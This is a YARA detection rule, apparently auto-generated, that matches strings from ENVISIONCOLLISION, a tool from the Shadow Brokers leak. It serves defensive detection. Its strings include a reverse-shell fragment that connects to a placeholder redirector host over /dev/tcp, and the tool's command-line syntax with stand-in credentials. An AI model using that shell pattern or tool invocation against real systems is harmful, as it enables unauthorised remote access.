rule FVEY_ShadowBroker_user_tool_envisioncollision {
  meta:
    author = "Spider"
    comment = "None"
    date = "2016-12-17"
    description = "Auto-generated rule - file user.tool.envisioncollision.COMMON"
    family = "None"
    hacker = "None"
    hash1 = "2f04f078a8f0fdfc864d3d2e37d123f55ecc1d5e401a87eccd0c3846770f9e02"
    judge = "unknown"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "https://bit.no.com:43110/theshadowbrokers.bit/post/message6/"
    threatname = "None"
    threattype = "None"
  strings:
    $x1 = "-i<IP> -p<port> -U<user> -P<password> -D<directory> -c<commands>" fullword ascii
    $x2 = "sh</dev/tcp/REDIR_IP/SHELL_PORT>&0" fullword ascii
    $x3 = "-n ENVISIONCOLLISION" ascii
    $x4 = "-UADMIN -PPASSWORD -i127.0.0.1 -Dipboard" fullword ascii
  condition:
    1 of them
}